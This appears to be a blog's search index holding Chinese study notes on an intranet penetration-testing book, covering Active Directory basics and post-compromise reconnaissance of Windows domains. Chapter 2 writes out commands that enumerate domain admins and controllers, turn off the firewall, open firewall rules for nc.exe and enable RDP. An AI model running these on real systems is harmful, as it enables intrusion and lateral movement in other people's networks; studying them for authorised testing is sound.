<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网安全攻防渗透测试实战指南-2</title>
      <link href="/2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/"/>
      <url>/2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/</url>
      
        <content type="html"><![CDATA[<h2 id="第2章-内网信息收集"><a href="#第2章-内网信息收集" class="headerlink" title="第2章 内网信息收集"></a>第2章 内网信息收集</h2><h3 id="2-1-内网信息收集概述"><a href="#2-1-内网信息收集概述" class="headerlink" title="2.1 内网信息收集概述"></a>2.1 内网信息收集概述</h3><p><strong>我是谁？</strong> ————对当前机器角色的判断。<br><strong>这是哪？</strong> ————对当前机器所处网络环境的拓扑结构进行分析和判断。<br><strong>我在哪？</strong> ————对当前机器所处区域的判断。</p><h3 id="2-2-收集本机信息"><a href="#2-2-收集本机信息" class="headerlink" title="2.2 收集本机信息"></a>2.2 收集本机信息</h3><ul><li>2.2.1 手动收集信息<br>本机信息包括操作系统、权限、内网<code>IP</code>地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。<ul><li>查询网络配置信息<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all</span><br></pre></td></tr></table></figure></li><li>查询操作系统及软件信息<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询操作系统和版本信息</span><br><span class="line">systeminfo |<span class="built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br><span class="line">查看系统体系结构</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%PROCESSOR_ARCHITECTURE%</span></span><br><span class="line">查看安装的软件及版本、路径等</span><br><span class="line">wmic product get name,version</span><br><span class="line">或</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li>查询本机服务信息<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li>查询进程列表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">或</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li>查看启动程序信息<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li>查看计划任务<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo list /v</span><br></pre></td></tr></table></figure></li><li>查看主机开机时间<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li>查询用户列表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">获取本地管理员（通常包含域用户）信息</span><br><span class="line">net localgroup administrators</span><br><span class="line">查看当前在线用户</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li>列出或断开本地计算机与所连接的客户端之间的会话<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure></li><li>查询端口列表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li>查看补丁列表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">或</span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br></pre></td></tr></table></figure></li><li>查询本机共享列表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">或</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure></li><li>查询路由表及所有可用的ARP缓存表<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li><li>查询防火墙相关配置<br><strong>关闭防火墙</strong><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows server 2003及之前的版本，命令如下。</span><br><span class="line">netsh firewall set option disable</span><br><span class="line">windows server 2003之后的版本，命令如下。</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><strong>查看防火墙配置</strong><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><strong>修改防火墙配置</strong><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows server 2003及之前的版本，允许指定程序全部链接，命令如下。</span><br><span class="line">netsh firewall add allowdprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">windows server 2003之后的版本，情况如下：</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line">允许指定程序退出，命令如下。</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line">允许3389端口放行，命令如下。</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line">自定义防火墙日志的存储位置</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li><li>查看代理配置情况<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_UESR\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure></li><li>查询并开启远程连接服务<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在命令行环境中执行注册表查询语句，命令如下。</span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br><span class="line">在windows server 2003中开启3389端口</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line">在windows server 2008和windows server 2012中开启3389端口</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li></ul></li><li>2.2.2 自动收集信息<br>执行该脚本后，会将所有结果写入一个HTML文件。<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f &quot;delims=&quot; <span class="variable">%%A</span> <span class="keyword">in</span> (&#x27;<span class="built_in">dir</span> /s /b <span class="variable">%WINDIR%</span>\system32\*htable.xsl&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> &quot;var=<span class="variable">%%A</span>&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get <span class="built_in">Label</span>,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /<span class="built_in">format</span>:&quot;<span class="variable">%var%</span>&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure></li><li>2.2.3 Empire下的主机信息收集<br>官方库：<code>https://github.com/EmpireProject/Empire</code><br>下载：<a href="https://github.com/EmpireProject/Empire/archive/refs/tags/2.5.zip">Empire-2.5.zip</a></li></ul><h3 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h3><ol><li>查看当前权限</li></ol><ul><li>获取一台主机的权限后，有如下三种情况：<br>本地普通用户<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/user.png"><br>本地管理用户<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/admin.png"><br>域内用户<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/domain.png"></li></ul><ol start="2"><li>获取域SID<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/sid.png"></li><li>查询指定用户的详细信息<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/win7-test.png"></li></ol><h3 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h3><ol><li>使用ipconfig命令<br>执行如下命令，可以查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处于同一网段等信息。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/ipconfig.png"><br>用nslookup来解析域名的IP地址<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/nslookup.png"></li><li>查看系统详细信息<br>如果”域”为”WORKGROUP”，表示当前服务器不在域内。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/systeminfo.png"></li><li>查询当前登录域及登录用户信息<br>“工作站域DNS名称”既域名（如果为”WORKGROUP”，表示当前环境为非域环境），”登录域”用于表示当前登录的用户是域用户还是本地用户，此处表示当前登录的用户是域用户。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/net_config.png"></li><li>判断主域<br>判断主域（域服务器通常会同时作为时间服务器使用），通常有如下三种情况。<br>存在域，但当前用户不是域用户。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/jujue.png"><br>当前网络环境为工作组，不存在域。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/workgroup.png"><br>存在域，且当前用户是域用户。<br><img src="/./2022/09/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-2/domain_user.png"></li></ol><h3 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h3><ul><li><p>2.5.1 利用NetBIOS快速探测内网<br>nbtscan是一个命令行工具，用于扫描本地或远程TCP&#x2F;IP网络上的开放NetBIOS名称服务器。</p></li><li><p>2.5.2 利用ICMP协议快速探测内网</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%I | <span class="built_in">findstr</span> &quot;TTL=&quot;</span><br></pre></td></tr></table></figure></li><li><p>2.5.3 通过ARP扫描探测内网</p><ol><li>arp-scan工具</li><li>EMpire中的arpscan模块</li><li>Nishang中的Invoke-ARPScan.ps1脚本</li></ol></li><li><p>2.5.4 通过常规TCP&#x2F;UDP端口扫描探测内网<br>ScanLine</p></li></ul><h3 id="2-6-扫描域内端口"><a href="#2-6-扫描域内端口" class="headerlink" title="2.6 扫描域内端口"></a>2.6 扫描域内端口</h3><p>需要关注：</p><ol><li>端口的Banner信息 </li><li>端口上运行的服务 </li><li>常见应用的默认端口</li></ol><ul><li>2.6.1 利用telnet命令进行扫描</li><li>2.6.2 S扫描器</li><li>2.6.3 Metasploit端口扫描</li><li>2.6.4 PowerSploit的Invoke-portscan.ps1脚本</li><li>2.6.5 Nishang的Invoke-PortScan模块</li><li>2.6.6 端口Banner信息</li></ul><h3 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h3><ol><li>查询域<br>net view &#x2F;domain</li><li>查询域内所有计算机<br>net view &#x2F;domain:hacker</li><li>查询域内所有计算机<br>net group &#x2F;domain</li><li>查询所有域成员计算机列表<br>net group “domain computers” &#x2F;domain</li><li>获取域密码信息<br>net accounts &#x2F;domain</li><li>获取域信任信息<br>nltest &#x2F;domain_trusts</li></ol><h3 id="2-8-查找域控制器"><a href="#2-8-查找域控制器" class="headerlink" title="2.8 查找域控制器"></a>2.8 查找域控制器</h3><ol><li>查看域控制器的机器名<br>nltest &#x2F;DCLIST:hacker</li><li>查看域控制器的主机名<br>nslookup -type&#x3D;SRV _ldap._tcp</li><li>查看当前时间<br>net time &#x2F;domain</li><li>查看域控制器组<br>net group “domain controllers” &#x2F;domain</li><li>域内存在多域查看主域控<br>netdom query pdc</li></ol><h3 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h3><h4 id="2-9-1-查询所有域用户列表"><a href="#2-9-1-查询所有域用户列表" class="headerlink" title="2.9.1 查询所有域用户列表"></a>2.9.1 查询所有域用户列表</h4><ol><li>向域控制器进行查询<br>net user &#x2F;domain</li><li>获取域内用户的详细信息<br>wmic useraccount get &#x2F;all</li><li>查看存在的用户<br>dsquery user<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">常用的dsquery命令</span><br><span class="line">dsquery computer - 查找目录中的计算机。</span><br><span class="line">dsquery contact - 查找目录中的联系人，</span><br><span class="line">dsquery subnet - 查找目录中的子网。</span><br><span class="line">dsquery group - 查找目录中的组。</span><br><span class="line">dsquery ou - 查找目录中的组织单位。</span><br><span class="line">dsquery site - 查找目录中的站点。</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例。</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额规定。</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象</span><br></pre></td></tr></table></figure></li><li>查询本地管理员组用户<br>net localgroup administrators</li></ol><h4 id="2-9-2-查询域管理员用户组"><a href="#2-9-2-查询域管理员用户组" class="headerlink" title="2.9.2 查询域管理员用户组"></a>2.9.2 查询域管理员用户组</h4><ol><li>查询域管理员用户<br>net group “domain admins” &#x2F;domain</li><li>查询域管理员用户组<br>net group “enterprise admins” &#x2F;domain</li></ol><h3 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h3><h4 id="2-10-1-域管理员定位概述"><a href="#2-10-1-域管理员定位概述" class="headerlink" title="2.10.1 域管理员定位概述"></a>2.10.1 域管理员定位概述</h4><p>在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限。<br>在一个域中，当计算机加人域后，会默认给域管理员组赋子本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。 因此，域管理员组的成员均可访问本地计算机，且具备完全控制权限。<br>定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或 Wevtutil 工具导出并查看。会话是指域内每台机器的登录会话，可以使用 nesess.exe 或 PowerView 等工具查询（可以圈名查询，不需要权限）。</p><h4 id="2-10-2-常用域管理员定位工具"><a href="#2-10-2-常用域管理员定位工具" class="headerlink" title="2.10.2 常用域管理员定位工具"></a>2.10.2 常用域管理员定位工具</h4><ol><li>psloggedon.exe</li><li>pvefindaduser.exe</li><li>netview.exe</li><li>nmap的NSE脚本</li><li>powerview脚本</li><li>Empire的user_hunter模块</li></ol><h3 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h3><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或者通过mimikaz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><h4 id="2-11-1-本机检查"><a href="#2-11-1-本机检查" class="headerlink" title="2.11.1 本机检查"></a>2.11.1 本机检查</h4><ol><li>获取域管理员列表<br>net group “domain admins” &#x2F;domain</li><li>列出本机的所有进程及进程用户<br>tasklist &#x2F;v</li></ol><h4 id="2-11-2-查询域控制器的域用户会话"><a href="#2-11-2-查询域控制器的域用户会话" class="headerlink" title="2.11.2 查询域控制器的域用户会话"></a>2.11.2 查询域控制器的域用户会话</h4><ol><li>查询域控制器列表<br>net group “domain controllers” &#x2F;domain</li><li>收集域管理员列表<br>net group “domain admins” &#x2F;domain</li><li>收集所有活动的会话列表<br>netsess -h</li><li>交叉引用域管理员列表与活动会话列表</li></ol><h4 id="2-11-3-查询远程操作系统中运行的任务"><a href="#2-11-3-查询远程操作系统中运行的任务" class="headerlink" title="2.11.3 查询远程操作系统中运行的任务"></a>2.11.3 查询远程操作系统中运行的任务</h4><h4 id="2-11-4-扫描远程系统对的netbios信息"><a href="#2-11-4-扫描远程系统对的netbios信息" class="headerlink" title="2.11.4 扫描远程系统对的netbios信息"></a>2.11.4 扫描远程系统对的netbios信息</h4><h3 id="2-14-域分析工具BloodHound"><a href="#2-14-域分析工具BloodHound" class="headerlink" title="2.14 域分析工具BloodHound"></a>2.14 域分析工具BloodHound</h3><p>Bloouitornd 是一款免费的工具。一方面，Bloodltound 通过图与线的形式，将城内用户、计算机、组、会话、ACL，以及城内所有的相关用户、组、计算机、登录信息、访问控制策略之间的关系，直观地展现在Red Team 成员面前，为他们更便捷地分析域内情况、更快速地在域内提供权限提供条件。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全攻防渗透测试实战指南-1</title>
      <link href="/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-1/"/>
      <url>/2022/06/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-1/</url>
      
        <content type="html"><![CDATA[<h2 id="第1章-内网渗透测试基础"><a href="#第1章-内网渗透测试基础" class="headerlink" title="第1章 内网渗透测试基础"></a>第1章 内网渗透测试基础</h2><h4 id="1-1-内网基础知识"><a href="#1-1-内网基础知识" class="headerlink" title="1.1 内网基础知识"></a>1.1 内网基础知识</h4><p>内网也指局域网（<code>Local Area Network, LAN</code>），是指在某一区域内由多台计算机互连而成的计算机组，组网范围通常在数千米以内。</p><ul><li><p>1.1.1 工作组<br>工作组（<code>Work Group</code>），将不同的计算机按功能（或部门）分别列入不同的工作组，例如技术部的计算机都列入”技术部”工作组、行政部的计算机都列入”行政部”工作组。如果输入的工作组的名称在网络中不存在，就相当于新建了一个工作组（当然，暂时只有当前这台计算机在工作组内）。工作组没有集中管理作用，工作组里的所有计算机都是对等的（没有服务器和客户机之分）。</p></li><li><p>1.1.2 域<br><strong>域</strong>（<code>Domain</code>）是一个有安全边界的计算机集合（安全边界的意思是：在两个域中，一个域中的用户无法访问另一个域中的资源）。<br><strong>域控制器</strong>（<code>Domain Controller, DC</code>）是域中的一台类似管理服务器的计算机，我们可以形象地将它理解为一个单位的门禁系统。域控制器中存在由这个域的账号、密码、属于这个域的计算机等信息构成的数据库。</p><ul><li>1.单域<br>在一个域内，一般要有至少两台域服务器，一台作为<code>DC</code>，另一台作为备份<code>DC</code>。</li><li>2.父域和子域<br>由于管理及其他需求，需要在网络中划分多个域。第一个域成为父域，各分部的域称为该域的子域。</li><li>3.域树<br>域树（<code>Tree</code>）是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域，不能访问或者管理其他域。如果两个域之间需要互相访问，则需要建立信任关系（<code>Trust Relation</code>）。<br>在一个域树中，父域可以包含多个子域。子域是相对父域来说的，指的是域名中的每一个段。各子域之间用点号隔开，一个”.”代表一个层次。</li><li>4.域森林<br>域森林（<code>Forest</code>）是指多个域树通过建立信任关系组成的集合。</li><li>5.域名服务器<br>域名服务器（<code>Domain Name Server, DNS</code>）是指用于实现域名（<code>Domain Name</code>）和与之相对应的<code>IP</code>地址（<code>IP Address</code>）转换的服务器。<br>内网渗透测试中，大都是通过寻找<code>DNS</code>服务器来确定域控制器的位置的（<code>DNS</code>服务器和域控制器通常配置在同一台机器上）。</li></ul></li><li><p>1.1.3 活动目录<br><strong>活动目录</strong>（<code>Active Directory, AD</code>）是指域环境中提供目录服务的组件。活动目录存储的是网络中所有资源的快捷方式，用户可以通过寻找快捷方式来定位资源。<br>在活动目录中，管理员不需要考虑被管理对象的地理位置，只需要按照一定的方式将这些对象放置在不同的容器中。这种不考虑被管理对象的具体地理位置的组织框架称为逻辑结构。活动目录的逻辑结构包括前面讲过的<strong>组织单元（<code>OU</code>）、域、域树、域森林</strong>。域树内的所有域共享一个活动目录，这个活动目录内的数据分散存储在各个域中，且每个域只存储该域内的数据。<br>活动目录主要提供以下功能（活动目录是微软提供的统一管理基础平台，<code>ISA</code>、<code>Exchange</code>、<code>EMS</code>等都依赖这个平台。）：</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul></li><li><p>1.1.4 域控制器和活动目录的区别<br>如果网络规模较大，就要把网络中的众多对象，例如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。<strong>这个拥有层次结构的数据库，就是活动目录数据库简称<code>AD</code>库。</strong><br>要实现域环境，其实就是要安装<code>AD</code>。如果内网中的一台计算机上安装了<code>AD</code>，它就变成了<code>DC</code>（用于存储活动目录数据库的计算机）。</p></li><li><p>1.1.5 安全域的划分<br><code>DMZ</code>成为隔离区，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区。<br><code>DMZ</code>常用访问控制策略：内网可以访问外网、内网可以访问<code>DMZ</code>、外网不可以访问内网、外网可以访问<code>DMZ</code>、<code>DMZ</code>不能访问内网、<code>DMZ</code>不能访问外网。 内网可以分为办公区和核心区。</p></li><li><p>1.1.6 域中计算机的分类<br>在域结构的网络中，计算机的身份是不平等的，有<strong>域控制器、成员服务器、客户机、独立服务器</strong>四种类型。<br><strong>1.域控制器</strong> 域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源（可以有多台计算机被配置为域控制器）。<br><strong>2.成员服务器</strong> 成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。<br><strong>3.客户机</strong> 域中的计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户就可以登录域。<br><strong>4.独立服务器</strong> 